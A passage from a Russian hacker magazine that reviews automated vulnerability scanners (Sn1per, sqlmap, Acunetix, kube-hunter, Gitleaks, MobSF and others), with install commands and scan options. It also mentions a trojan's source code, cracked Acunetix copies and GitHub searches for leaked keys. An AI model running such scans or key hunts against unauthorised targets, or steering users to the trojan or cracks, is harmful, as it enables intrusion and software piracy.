 • Gradle Killer — убивает процесс Gradle одной кнопкой (полезно для быс‐
   трой останов ки сборки или освобождения памяти);
 • Kotlin Fill Class — позволяет быс тро создать класс с дефолтны ми свой‐
   ствами;
 • TabNine — плагин авто дополнения на основе нейросети, обу ченной
   на коде GitHub;
 • SQLScout — плагин для управления базами SQLite в режиме реального
   времени;
 • Material Design Icon Generator — плагин для генерации иконок в сти ле
  MD.





             Результат работы плагина Rainbow Brackets


ИНСТРУМЕНТЫ
 • XploitSPY — исходники мощного трояна с панелью управле ния в комплекте
   (код основан на проекте L3MON);
 • Aind — образ Docker, позволяющий запускать приложения для Android
   в Linux без использования эмулято ра (осно ван на Anbox);
 • FridaAndroidTracer — скрипт, формирующий отчет о приложе нии и его
   активности;
 • Runtime Mobile Security — веб‐интерфейс для Frida.


БИБЛИОТЕКИ
 • WindowInsetsAnimation — пример кода для работы с новым API клавиатуры
   в Android 11;
 • AndColorPicker — быстрый настра иваемый компонент для выбора цвета;
 • Chip‐navigation‐bar — очередная панель навигации в нижней час ти окна;
 • PowerPermission — удоб ная обертка для работы с раз решениями;
 • Venom — библиотека для быстрого убийства приложения в целях тес‐
   тирования;
 • Android‐lints — несколь ко кастомных lint‐пра вил для проверки качес тва
   кода;
 • Blitz — TextView, показывающий прошедшее время («пять минут назад»).
COVERSTORY
ХАК
 В ОДИН КЛИК





                                              Hackcat
                                             hackcat.dev@gmail.com



     СРАВНИВАЕМ ВОЗМОЖНОСТИ
     АВТОМАТИЧЕСКИХ СКАНЕРОВ
          УЯЗВИМОСТЕЙ





Для поиска уязвимостей вручную тре буются особые знания,
богатый опыт и редкое  чутье. Но  как быть нович кам?
Как набраться опыта, если не знаешь, с чего начинать?
На помощь приходят автомати ческие сканеры уязвимостей.
В этой статье мы посмотрим, какие они бывают и как ими
пользоваться.


Айтишники, как известно, стремят ся все автомати зировать, и хакеры в этом
не отстают. Существуют автоматические сканеры уязвимостей — чтобы мож‐
но было запустить, откинуть ся на спинку крес ла и потягивать кофе (или пив‐
ко), пока они сделают целую гору работы. Поиск уязвимостей с их исполь‐
зованием сводится к тому, чтобы отдать ска неру адрес цели и нажать боль‐
шую кнопку Start, ну или Enter, если ты любитель терминала.
  При этом понятно, что ска нер найдет только типовые уязвимости и, чтобы
пойти дальше, нужно уметь не только нажимать на кнопку. Но почему бы
не сэкономить немного сил? Во многих случаях это вполне оправданно.


КАТЕГОРИИ И МЕТОДЫ
Универсальных инструментов не существует, и ска неры уяз вимос тей не стали
исключением из этого пра вила. Они обычно нацелены на  уязвимости
какого‐то определен ного рода. В этой статье мы рассмотрим сле дующие
виды сканеров.
 • WVS (Web  Vulnerability Scanner) — сканеры веб‐уязвимостей. У меня
   это самая многочисленная категория. Сюда входят как обще известные
  OWASP ZAP и sqlmap, так и менее извес тные, но не менее полезные, вро‐
   де Vega.
 • Анализаторы мобиль ных приложений. Тут очень мало достойных продук‐
   тов, и мы остановимся на самых ярких из них.
 • Полууниверсальные сканеры для локальной сети предприятия или дома.
   Это уже не просто сканеры, а целые комбайны для анализа и учета обо‐
   рудования в сети. Многие из них заодно ищут уязвимости.
 • Всякие узкоспециализированные сканеры типа анализа исходного кода,
   Git/SVN‐репозиториев и других сложных для ручной обработки мас сивов
   данных.

Сканеры бывают со сво бодной лицензией и коммерческие. Если с опен‐
сорсом все понятно, то для использования коммерчес ких придется выложить
весьма приличную сумму. К сожалению, ни редакция «Хакера», ни автор
не настолько богаты, чтобы покупать их для обзора. Поэтому для всех ком‐
мерческих сканеров была использована офи циальная пробная версия, если
не оговоре но иное.


           WARNING

                      Вся информация в этой статье предоставлена
                      исключительно   в   ознакомительных   целях.
                    Ни редакция, ни автор не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами дан ной статьи. Помни, что доступ к данным
                       без предварительного письменного соглашения
                        с их владельцем преследуется по закону.


Само тестирование тоже бывает раз ным: Black Box либо White Box. При пер‐
вом типе пентестер или его инстру мент должны работать с сервисом через те
же интерфейсы, через которые с ним вза имодействуют пользователи. Нап‐
ример, если для тестирова ния методом Black Box тебе дан сайт, то ты
можешь проверять его только как посетитель, без какого‐либо специального
доступа к исходному коду или привилегированным аккаунтам. Если это при‐
ложение, то подразумевает ся, что у тебя нет дос тупа к исходникам: ковыряй
сам, если сможешь. В общем, Black Box зна чит, что у тебя нет ничего, чего бы
не было у всех.
  При тестировании методом White Box пентестер (или хакер) имеет доступ
ко всем пот рохам целевого объекта. Если это сайт — у тебя есть его код.
Если это сервер — у тебя есть дос туп к его внут ренностям вроде версии ОС
и установленного софта или к некото рым файлам. В этом случае воз можнос‐
ти куда шире и ты можешь найти проб лему, которую способен экс плуати‐
ровать только продвинутый зло умышленник.
  В сегодняшней подборке представлены ска неры обеих категорий, так что
эту статью можно считать универсаль ной отмычкой почти к любому замку.
И конечно, если я что‐то забыл, не стесняйся исполь зовать комментарии.


SN1PER
 • Це на: Community edition — бес платно, Professional edition — от 150 дол‐
   ларов

Sn1per — мощный фреймворк для автомати чес кого анализа безопасности
цели. Разработан небезызвес тным 1N3, основателем компании XeroSecurity.
Из других его известных инстру ментов — Findsploit (для быс трого поиска экс‐
плоитов к уязвимости) и PrivEsc — для поис ка локальных багов EoP.





Sn1per поставляется в двух вариантах. Есть версия Community «для всех
и даром» и Sn1per Professional, лицензия на который стоит от 150 зеленых
американских рублей.
  В бесплатном варианте ска нер умеет собирать базовую информацию (IP
цели, ping, whois, DNS); запускает Nmap для поис ка открытых портов и опре‐
деления сервисов, в том числе и с помощью NSE; ищет часто встречающиеся
уязвимости и автоматичес ки эксплуатирует  их; пробует получить доступ
ко всем файловым шарам  (FTP, NFS, Samba); запускает  Nikto, WPScan
и Arachni для всех найден ных веб‐приложений и многое другое. Поддержи‐
вает интеграцию с Hunter.io, OpenVAS, Burp Suite, Shodan, Censys и Metasploit.
   Установка доволь но проста и поддерживает Docker, что сводит ее к двум
командам:


docker pull xerosecurity/sn1per
docker run ‐it xerosecurity/sn1per /bin/bash

Для сканирования выполни


sniper ‐t [TARGET]

Чтобы задействовать все воз можнос ти Sn1per, понадобятся допол нительные
клю чи:
 • o — использует движок OSINT;
 • re — разведка;
 • fp — полностью про рабо тать все порты;
 • m stealth — старательно скрывает ска нер, чтобы цель не поняла, что
   ее сканируют;
 • m webscan — Sn1per будет работать как обычный сканер WVS;
 • b — использовать брутфорс при необходимос ти;
 • f [FILE] — сканиро вать сра зу несколько целей, которые перечислены
   в файле [FILE];
 • m nuke — «ядерный» режим сканирования. Включает в себя брутфорс,
   обработку всех портов, OSINT, разведку и сохранение всех находок (loot);
 • m massvulnscan — очень мощная функция в сочетании с f . Массово
   сканирует на многие известные уяз вимости все заданные цели. Если
   в тестируемой компании много хос тов, эта опция будет весьма полезна;
 • m discover — опция поиска всех хос тов в заданной подсети и запуск
   сканирования на каждый из найденных. Если ты даже не знаешь всех воз‐
  можных целей, это будет очень полезно.

Пример репорта после сканирования очень большой, но он есть в репози‐
тории автора.


WAPITI3
 • Це на: бесплатно

Wapiti — подвид американских оленей пол ностью бес платный  сканер
веб‐уязвимостей. На момент написания статьи последняя версия была 3.0.3,
выпущенная 20 фев раля этого  года, то есть проект живой. Нес мотря
на скромные размеры сканера (всего 2,3 Мбайт в рас пакованном виде),
набор функций у него довольно обширный. По официальному заявлению,
сканер умеет обнаружи вать следующие баги:
 • раскрытие содержимого файла (local ﬁle inclusion), в том числе бэкапов
   и исходного кода сайта;
 • SQL‐инъекции и внед рение кода PHP/ASP/JSP;
 • отраженные и хранимые XSS;
 • инъекции команд ОС;
 • XXE Injection;
 • неудачные конфигурации .htaccess;
 • Open Redirect.

Wapiti3 поддерживает прокси, аутентифика цию на целевом сайте, уме ет
не кричать на самопальные сертифика ты SSL и может вставлять в запросы
любые заголовки (в том числе кас томный User‐Agent).
  Использование инструмента весьма тривиально. Пос ле установки выпол‐
ни в терминале (да, это консольное приложение) такую команду:


wapiti ‐u [URL]

Wapiti просканирует весь сайт и выдаст соответству ющий отчет. Чтобы исклю‐
чить ненужные адреса (например, logout), добавь параметр ‐x [URL], а для
авторизованного сканирования требуются куки. Для их использования сна‐
чала сгенерируй JSON‐файл с помощью специального скрипта. Он лежит
в bin/wapiti‐getcookie и запускает ся следующим образом:


wapiti‐getcookie ‐u [LOGIN_URL] ‐c cookies.json ‐d "username=[USER]&
password=[PASS]"

[LOGIN_URL] — это адрес страницы логина, а [USER] и [PASS] — логин
и пароль соответственно. Затем подключаем готовый файл к сканеру:


wapiti ‐u [URL] ‐x [EXCLUDE] ‐c cookies.json

Вот и все. Отчет генерируется в HTML и сохраня ется в /home/[USER]/.wapi‐
ti/generated_report/[TARGET_HOST]_[DATE]_[ID].html,  где  [USER] —
твой логин, [TARGET_HOST] — целевой сайт, [DATE] — дата сканирования и
[ID] — четыре цифры. Мож но открыть в браузере и посмотреть.


NIKTO
 • Це на: бесплатно

Nikto — весьма популярный сканер веб‐приложений, изначально встроенный
в Kali Linux. Он крайне прос той, даже не прячется от WAF прочего зловредно‐
го ПО на сайте, но довольно точен. Умеет находить:
 • странные и необычные заголовки;
 • утечки inode через заголо вок ETag;
 • использование WAF;
 • множество интересных файлов, к которым не сто ило бы открывать доступ.

Как видишь, не очень много. Но зато он быстро работает и не требует нас‐
тольного справоч ника для запус ка сканирования.
  Имеет кучу параметров. Самый главный из них — ‐h [HOST], задающий
цель. Если цель умеет в SSL, стоит указать параметр ‐ssl. Также есть фор мат
вывода (‐Format) и возможность работать с Metasploit. Инстру мент немного
устарел, но по‐прежнему годит ся для разведки и взлома совсем уж без‐
надежных целей.


OWASP ZAP
 • Це на: бесплатно

Сканер той самой организа ции OWASP, которая призвана сделать наш
с тобой интернет безопаснее. Впрочем, пока не сильно успешно. А еще,
кстати, есть список OWASP Top 10, где соб раны десять самых распростра‐
ненных багов в веб‐приложениях. ZAP (Zed Attack Proxy) — бесплатный инс‐
трумент  для  тестирования  на  проникновение  и  поиска  уяз вимос тей
в веб‐приложе ниях. Его главные фичи:
 • MITM‐прокси для захвата тра фика браузера;
 • пассивный и активный сканеры уязвимостей;
 • паук‐краулер, который может работать даже с AJAX;
 • фаззер параметров;
 • поддержка плагинов;
 • поддержка WebSocket.

У программы есть русский интерфейс (частично), неплохой GUI и инс трукция
по пользованию для новичков. При запус ке показы вает советы.





                          Запуск ZAP

Сканирование требует только ука зать адрес сай та. Воистину «нажал и взло‐
мал»!





                               Press to Hack

По эффективности обна ружения багов ZAP очень хорош, использую его
парал лельно с Vega и Acunetix. Однозначно рекомендую.


SQLMAP
 • Це на: бесплатно

Sqlmap — это, наверное, самый известный сканер для поиска SQL‐инъекций.
Его разработкой занимаются Мирос лав Штампар (Хорватия) и Бернардо
Дамеле (Италия). Особенность это го ска нера в том, что он может не только
найти ошибку, но и сразу экс плуатировать ее, причем в полностью автомати‐
ческом режиме. Умеет работать с БД MySQL, MS SQL, PostgreSQL и Oracle.


        WWW

                     Подробнее про sqlmap читай в статье «SQL‐инъ‐
                       екции — это просто».


С выхода прошлой статьи об этом шикарном инстру менте почти ничего
не изменилось. Почти — потому что у sqlmap наконец появился GUI, что
еще сильнее понизило порог вхождения.





                             Тот самый GUI


ACUNETIX WVS
 • Це на: базовая версия — от 4495 долларов за один сайт (и растет по мере
   количества сайтов, которые ты планируешь ска нировать). Рас ширенная
   версия — от 6995 долларов за один сайт (но умеет намного больше)

Было бы странно, если бы эта подборка обошлась без коммерческих ска‐
неров. Именно Acunetix WVS недавно на шел баг у Google, а одноименная
компания‐разработчик — один из лидеров рын ка.
  Сам сканер — это веб‐приложение, и его можно ставить на «безголовый»
сервер (то есть вообще без графичес кой оболочки). Есть поддержка и Win‐
dows, и Linux. К сожале нию, сам ска нер кому попало не продается, так что
«кто попало» выкручивается с помощью тематичес ких сайтов. К последней,
13‐й версии кряка нет, поэто му сейчас у хакеров в ходу 12‐я версия.
   Установка — классичес кая для Windows‐при ложений. Там задается логин
и пароль к веб‐интерфейсу, также есть возможность открыть удаленный дос‐
туп к сканеру (удобно пос тавить его на VPS).
  После установки видим главную страницу интерфей са. Интерфейс прос‐
той, разберется любой школьник. Есть цветовое определение тяжести най‐
денного бага и готовый рейтинг CVE. Пользоваться сканером действительно
удобно и приятно.
   Сканирование требует только ука зать адрес цели (на вкладке Targets)
и нажать кнопку Scan, опционально задав время начала. Сканер име ет нес‐
колько профилей  сканирования, может  сканировать  только  в рабочее
или нерабочее время и, по сло вам производителя, умеет находить почти все
виды багов. В этот список входят:
 • XSS, в том числе DOM;
 • SQL‐инъекции, кроме слепых (blind);
 • CSRF;
 • обход директории;
 • XXE Injection;
 • небезопасная сериализация;
 • проблемы с SSL‐сертифика тами (скорое истечение срока годности, сла‐
  бые шифры);
 • проблемы с CORS.

Сканер действительно быстрый и качес твенный, для участия в bug bounty
подходит идеально. Жаль, цена кусается. Но я просто обязан его порекомен‐
довать, это один из лучших инс трументов.


VEGA
 • Це на: бесплатно

Еще один сканер с открытым исходным кодом, разработан в компании Sub‐
graph. Да, той самой Subgraph, которая сделала клиент Tor на чистой Java.
Удивительно, но Vega бесплатный, а по возможностям ничуть не хуже
Acunetix.
  По заверениям производителя и собственным наблюдениям, сканер
хорошо ищет следующие баги:
 • SQL‐инъекции;
 • XSS;
 • XXE Injection;
 • Integer Overﬂow/Underﬂow (кста ти, единственный сканер, который их нор‐
   мально ищет);
 • раскрытие содержимого файла (local ﬁle inclusion);
 • внедрение кода;
 • path traversal;
 • внедрение HTTP‐заголовков;
 • плохие настрой ки CORS.

Сканер написан на Java, а зна чит, работает вез де, где есть Java VM, включая,
конечно, Windows и Linux. Недос татки: нужна та самая JVM, к тому же здесь
нет веб‐интерфейса.
  Запуск сканирования тоже тривиален, но, в отличие от других сканеров,
у Vega много настроек.





А скрыты эти настрой ки за кнопкой Next.





Но и это еще не все! Есть поддержка авторизованного сканирования, причем
без необходимости добавлять cookies из консоли.
  Короче, благодаря удоб ному GUI, качес твенной работе и куче возможнос‐
тей это сейчас лучший выбор для пользователя Windows. Если же чего‐то
не хватит, всегда можно написать свой модуль на JavaScript.


             INFO

                   Было бы неправильно не упомянуть в этой под‐
                       борке Nmap. Сам по себе он на звание сканера
                         уязвимостей не тянет, но у него есть скрип товый
                      движок. Даже «из коробки» он умеет проверять
                       популярные баги, но ты легко можешь сделать
                         этот глаз еще зорче с помощью своих (или чужих)
                       скриптов. Как их создавать, мы уже писали,
                       а найти скрипт на любой вкус можно на GitHub.



NESSUS
 • Це на: бесплатно / 3120 дол ларов

Nessus — коммерческий ска нер безопасности американской компании Ten‐
able. Также есть облачный ска нер Tenable.io, на котором я не буду останав‐
ливаться подробно.
   У сканера три редакции: Essentials (для всех и бес платно), Professional
(3120 долларов в год) и Tenable.io, который, по сути, представляет собой
отдельный продукт со своей ценой. При этом раз ница между редакциями Es‐
sentials и Professional лишь в количес тве дос тупных для сканирования адресов
и наличии поддержки по email.
  Сам сканер довольно увесистый (установщик больше 120 Мбайт, а после
активации скачивает еще много допол нений), и ска чать его можно только
после регистрации, во время которой на почту придет код активации.





                      Nessus кача ет допол нения

Инициализация весьма продолжительная, у меня заняла порядка двадцати
минут.
   Когда  с  этим  будет  покончено,  можно  начинать  пользоваться
веб‐панелью. Nessus ищет следующие проблемы:
 • раскрытие версий ПО на хостах;
 • активная малварь;
 • уязвимость к брутфорсу;
 • слабые методы авторизации;
 • открытые данные на целях (воз можность перечислить учетные записи
   и группы, удаленный реестр и сетевые папки);
 • некорректные разрешения и политики безопасности.

Может работать как краулер.
   Лично мне не очень понравился, хотя бы жес ткими рамками бесплатной
версии.


KUBE-HUNTER
 • Це на: бесплатно

Специализированный ска нер для ана лиза безопасности кластеров Kuber‐
netes. Распространяется по свободной лицензии Apache.
   Этот охотник ищет косяки в удаленных кластерах, а затем одним метким
выстрелом пробивает защиту. Пользоваться им следует с осторожностью,
потому что в погоне за добычей он может что‐нибудь испортить. Впрочем,
об этом можно не беспокоиться, пока ты работаешь с ним в «обыкновенном»
режиме. В таком режиме он будет находить дыры, но не полезет в них сам.
Если же ты решил доверить все в руки Kube‐hunter, есть режим «активной»
охоты.
   Скачать сканер можно на GitHub, он написан на Python и нормально
работает почти в любой ОС. Впрочем, можно использовать и Docker:


docker pull aquasec/kube‐hunter
docker run ‐‐rm aquasec/kube‐hunter [ARGUMENTS]

После скачивания и уста новки зависимостей запус каем. Весь набор функций
можно увидеть только с помощью допол нительных ключей запуска. Вот они:
 • remote [ADDRESS] — ска ниро вать клас тер по адре су;
 • cidr [CIDR] — найти и атаковать все кластеры в диапазоне адре сов;
 • active — тот самый режим активной охоты. Используй, если в раз‐
  решении на пентест указано, что ты не несешь ответственности за сох‐
   ранность инфраструктуры заказчика. Короче, я предупредил;
 • mapping — вывести все найденные узлы Kubernetes. Полезно с опци ей
  cidr;
 • log [LEVEL] — выводить сооб щения по уровню важности. [LEVEL]
  может быть DEBUG, INFO (по умолчанию) или WARNING;
 • report  [TYPE] — ука зывает фор мат вывода отчета. Может быть
  json, yaml или plain. Эту опцию можно сочетать со следующей;
 • dispatch [MODE] — ука зывает, куда нужно отправить отчет после
   завершения сканирования. По умолчанию stdout, но можно отправить
   и по HTTP, тогда параметром нужно передать dispatch http. А чтобы
   Kube‐hunter знал, куда имен но отправлять результаты, объ ясни ему это в
  переменных среды:


KUBEHUNTER_HTTP_DISPATCH_URL  (по умолчанию — https://localhost)
KUBEHUNTER_HTTP_DISPATCH_METHOD (по умолчанию — POST)

Очень удобная функция, которой нет в других сканерах, — возможность прос‐
матривать результаты работы на онлайновом дашборде, даже если сканер
работает за NAT или еще как‐то отгорожен от сети. Для использования фичи
нужно зарегистрироваться на сайте компании.
   Скажу еще, что Kube‐hunter можно использовать не только против удален‐
ной цели. Еще его можно установить как pod и сканировать изнутри. Об этом
подробнее расписано в файле readme.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

     ХАК В ОДИН КЛИК
                   СРАВНИВАЕМ ВОЗМОЖНОСТИ
         АВТОМАТИЧЕСКИХ СКАНЕРОВ УЯЗВИМОСТЕЙ





TRIVY
 • Це на: бесплатно

Еще один сканер безопас ности контейнеров того же разработчика (Aquasec).
Для bug bounty пригоден куда мень ше предыду щего, но довольно точен
и быстр. Специализируется конкретно на Docker. Устанавливается чуть слож‐
нее, чем Kube‐hunter. Для установки в Debian, Ubuntu и Kali можно исполь‐
зовать следующий скрипт:


sudo apt‐get install wget apt‐transport‐https gnupg lsb‐release
wget ‐qO ‐ https://aquasecurity.github.io/trivy‐repo/deb/public.key
| sudo apt‐key add ‐
echo deb https://aquasecurity.github.io/trivy‐repo/deb $(lsb_release
‐sc) main | sudo tee ‐a /etc/apt/sources.list.d/trivy.list
sudo apt‐get update
sudo apt‐get install trivy

После   этого  можно   ска нировать.   Для   этого   просто   выполни
trivy [IMAGE_NAME]:


trivy python:3.4‐alpine

Результат — ниже.



  Total: 1 (UNKNOWN: 0, LOW: 0, MEDIUM: 1, HIGH: 0, CRITICAL: 0)


  +‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐
  ‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | LIBRARY | VULNERABILITY ID | SEVERITY | INSTALLED VERSION | FIXED VER‐
  SION |             TITLE              |
  +‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐
  ‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+
  | openssl | CVE‐2019‐1543    | MEDIUM   | 1.1.1a‐r1         | 1.1.1b‐r1
  | openssl: ChaCha20‐Poly1305     |
  |         |                  |          |                   |
  | with long nonces               |
  +‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐
  ‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+


Можно сканировать образы в виде файлов:


trivy ‐‐input image.tar

За формат вывода отвечает ключ ‐f, который можно выставить в json. Есть
также поддержка вывода по кас томному шаб лону.
   Чтобы показать только определенные типы найденных уязвимос тей, нужно
указать ключ ‐‐severity и через запятую перечислить категории для отоб‐
ражения (UNKNOWN, LOW, MEDIUM, HIGH, CRITICAL).


PVS-STUDIO
 • Це на: ~5250 евро с воз можностью получить бесплатно (и легально)

Бывает, что в рамках bug bounty для исследова ния предлагают исходный код
продукта. Однако хороших инстру ментов для авто матизации такой работы
очень мало. Вруч ную же искать баги среди миллионов строк кода — занятие
весьма неблагодарное, тем более что кодовая база в активном проекте
регулярно обновляется.
  Иссле дователь устает, да и в прин ципе не способен выследить большинс‐
тво косяков сам. Другое дело — софт! И тут нам помогли наши соотечествен‐
ники, создав PVS‐Studio. Это весь ма годный коммерческий статичес кий ана‐
лизатор.





                     PVS‐Studio — хороший единорог

PVS‐Studio умеет находить баги в коде на C, C++, C# и Java. Для исполь‐
зования его нужно скачать с сайта разработчика и установить. Есть версии
для Windows (в виде расширения для Visual Studio), Linux (пакеты deb и rpm)
и macOS.
   Сканер требует регистра ции — ввести ключ, полученный от раз работчика.
И тут я встретил самую быструю и дружелюбную реакцию среди всех про‐
изводителей коммерчес ких сканеров.
   Пользоваться PVS‐Studio можно разработчикам откры тых проектов, пуб‐
личным специалистам в ИБ и обладателям ста туса Microsoft MVP. Я получил
лицензию по второму способу как автор «Хакера». Если ты тоже занимаешься
ИБ — попробуй получить такую лицензию.
   Если ты используешь плагин для Visual Studio, то все найденные ошибки
будут выведены в лог при компиляции или при нудительной проверке.





                        PVS‐Studio нашел ошибку

Ниже — пример использования. Я решил про верить код из своей прошлой
статьи («Пишем на C# утилиту для мониторин га сети»), и обнаружилась ошиб‐
ка.





                  Ошибка в моем проекте

В общем, сканер действитель но хороший и быс трый, а пользоваться им
при определенных обстоятельствах мож но и бес платно. Жаль, для остальных
случаев цена кусается.


GITLEAKS
 • Це на: бесплатно

Как известно, чем крупнее продукт, тем больше для его разработки привлека‐
ется подрядчиков и тем больше рядовых сотрудни ков взаимодействуют с его
кодом. И пока все действия выполняются на виртуальных машинах, не под‐
клю ченных к сети, а всех вхо дящих и выходящих проверяют на рентгеновском
сканере, все выглядит хорошо. Но когда для разработ ки и тес тирования приг‐
лашают подрядчиков, которые работа ют из дома, начинаются проблемы.
   Часто в коде тестов QA‐специалистов попада ются при вилегированные
клю чи для доступа к инфраструктуре, а Security‐инженеры забывают приват‐
ную информацию в своих пуб личных репозиториях для бэкапов. Если найти
такой ключик, то взлом может закончить ся, даже не начавшись, так что нельзя
забывать про этот век тор атаки. Подобные данные можно найти по запросам
вида company.com pass и company.com private на GitHub, а можно и с
помощью автоматических скриптов.
  Один из таких инстру ментов — это Gitleaks, который быстро и качественно
найдет почти что угодно в любом откры том репозитории. Он умеет сле‐
дующее:
 • проверять локальные изменения до коммита, чтобы избежать утечек дан‐
   ных еще на стадии раз работки;
 • проверять любые репозитории GitHub/GitLab, в том числе приватные
   репозитории, если есть ключ дос тупа;
 • проверять все репозитории заданного пользователя или организации;
 • выдавать отчет в JSON, что удоб но для последующего автоматического
   анализа;
 • интегрироваться с Git, чтобы предотвратить непреднамеренную утечку.

Установить его можно с помощью Docker.


docker pull zricethezav/gitleaks
docker run ‐‐rm ‐‐name=gitleaks zricethezav/gitleaks ‐v ‐r [REPO_URL]

Использование инструмента и все его ключи запуска описаны в справке
к программе, но некото рые из них я продуб лирую здесь.
 • v — детальный вывод сооб щений;
 • repo=[REPO] — ссылка на репози торий для проверки;
 • disk — клонировать репозиторий локально, чтобы не исчерпать всю
   память сразу;
 • usename=[USER] и password=[PASS] — указывает логин и пароль
   для доступа к приватному репозиторию;
 • accesstoken=[TOKEN] —  альтернатива  авторизации по  логину
   и паролю;
 • commit=[COMMIT] — SHA коммита для ана лиза, если хочется про‐
   верить репозиторий в какой‐то момент. По умолчанию проверяется
   текущее состояние;
 • repopath=[PATH] —  ана лизи ровать  локальный  репози торий
   по заданному пути;
 • branch=[BRANCH] — ана лизировать толь ко конкретный branch;
 • depth=[NUM] — ана лизировать только [NUM] последних коммитов.
   Альтернатива — commitfrom=[COMMIT] и committo=[COMMIT],
   проверяющие коммиты между заданными включительно;
 • threads=[NUM] — ска ниро вать в несколько потоков.

Чтобы выпотрошить все репозитории конкретной организации или поль‐
зователя, используй следующие парамет ры:
 • org=[ORG] — искать и ана лизировать все репозитории организации
  [ORG];
 • user=[USER] — то же, но для поль зователя;
 • excludeforks — исклю чить из анализа форки репозиториев. В них
   редко можно найти что‐либо полезное, а вот сканирование эта опция
   ускорит значительно.

Для использования этой функции надо ука зать ути лите, какой сервис мы
хотим задействовать. Пока поддерживаются GitHub и GitLab. Задать сервис
можно опцией ‐‐host=[SERVICE], где [SERVICE] — GitHub или GitLab.
  В целом инструмент очень хороший и часто незаме нимый. Рекомендую
для использования в bug bounty и при пентестах.


QARK
 • Це на: бесплатно

Бывает, что нужно протестировать приложения для Android и iOS. И если
с проверкой на секретные значения в коде все понятно, да и с анализом дан‐
ных, сохраняемых в небезо пасных местах, тоже, то некоторые баги выявить
ой как непросто. Сюда попадает пло хо реализованное шиф рование  (с
помощью XOR, к примеру), некорректная обра бот ка внешних ссылок, откры‐
тые activity, которые раскрывают приватную информацию, флаг android:de‐
buggable=true и так далее.
  QARK (Quick App Review Kit) — бесплат ный инстру мент, созданный в ком‐
пании LinkedIn, для быстрого ана лиза пакета APK на некоторые уязвимости.
Их список, как говорит раз работчик, следующий:
 • некорректно экспортируемые элементы или неправильные права доступа
   к экспортируемым объ ектам;
 • уязвимые интенты;
 • неправильная работа с сертификатами X.509;
 • создание файлов, которые доступны другим приложениям, и работа
   с такими файлами;
 • дырявые activity;
 • использование захардко женных приватных ключей;
 • слабые шифры;
 • tapjacking;
 • приложение разрешает бэкап сво ей приватной папки или имеет флаг an
  droid:debuggable=true.

Утилита написана на Python и способна работать как на Linux, так и в Windows.
Установить можно через pip или путем сбор ки исходников самос тоятельно.
Первый способ:


pip install ‐‐user qark

Второй способ:


git clone https://github.com/linkedin/qark
cd qark
pip install ‐r requirements.txt
pip install . ‐‐user

После установки можно выполнить qark ‐‐help, чтобы прочитать справку.
А можно и не выпол нять, сейчас я крат ко перескажу главное.
  Для анализа целого APK использует ся аргу мент ‐‐apk FILE.APK:


qark ‐‐apk ./my_app.apk

Если ты решил тестировать с помощью этого инс трумента свой (или деком‐
пилированный чем‐то другим) код, то используй аргу мент ‐‐java:


qark ‐‐java ./my_app_src

Можно прогнать через ска нер только какой‐то отдель ный файл:


qark ‐‐java ./my_app_src/Main.java

Особенность сканера в том, что к некоторым багам он уме ет сразу сделать
эксплоит, но эта функция слегка нес табильна и работает далеко не для всех
багов, так что особен но надеяться на нее не стоит.


BURP SUITE
 • Це на: бесплатно / 400 дол ларов

Было бы странно, если бы я не упомянул этот швейцарский нож из мира ска‐
неров. Это целый комбайн, который умеет работать как прокси, сканер уяз‐
вимостей, паук‐краулер, репитер зап росов или платформа для множес тва
плагинов.


        WWW

                     Про полезные плагины для Burp читай в статье
                            «Прокачай свой Burp! 11 наиболее полезных пла‐
                        гинов к Burp Suite».


Сканер разработала компания PortSwigger и выпус тила в двух редакциях:
Community (бесплатно) и Professional (400 долларов). Пос ледняя отличается
наличием в ком плекте большого количес тва пла гинов для Burp  Intruder,
наличием автоматического сканера и отсутствием ограничений в BApp Store.
  Имеется неп лохой GUI с удобными вкладками, автоматичес кие модули
для подбора паролей, идентифика торов, фаззинга, кодировщики и рас‐
кодировщики данных в раз ных форматах. Обзо ров Burp не делал только
ленивый, так что я толь ко оставлю ссылку на такой обзор, чтобы не повторять‐
ся.


MOBSF
 • Це на: бесплатно

Последний в этой статье, но не пос ледний по ценности и наворотам сканер,
который будет отлично смотреть ся в арсенале пентестера. Это еще один ста‐
тический анализатор мобильных приложений, тоже написанный на Python,
но работающий только в Windows.





MobSF запускается даже на «безголовом» сервере и откры вает наружу
порт 8000. Если зайти туда бра узером, видим типичное веб‐приложение.





                       Главная стра ница MobSF

Загружаем туда APK или IPA (да, приложения для iOS тоже поддержи ваются)
и ждем окончания анализа. Пос ле этого видим весьма обширный отчет о най‐
денных багах с указанием воз можности эксплуата ции. Цветовая индикация
серьезности тоже присутствует, и в целом интерфейс весьма дружес твенный,
не хватает только поддержки рус ского.





             Иллюс тра ция взята из репозитория проекта

Сканер умеет анализировать код, сертификат, которым подписано приложе‐
ние, его манифест  (AndroidManifest.xml) и поз воляет выгрузить деком‐
пилированный код для последу ющего анализа в дру гих программах. Анализ
выпол няется как статически (декомпиляция и ана лиз полученного кода), так
и динамически (запуск в вир туальном окружении).





                 Работа динамичес кого ана лиза тора

Можно скачать инструмент на GitHub или установить по инструкции ниже.
  Для начала нам нужен Python с pip. Далее установи rsa следующей
командой:


python ‐m pip install rsa

Скачай скрипт установки и выполни. Отвечай на вопросы (установщик инте‐
рактивный) — и поль зуйся на здоровье.
  Можно также основную часть инс трумента запустить на одной машине (это
может быть Linux), а сервер для статичес кого ана лиза — на другой (тут нужна
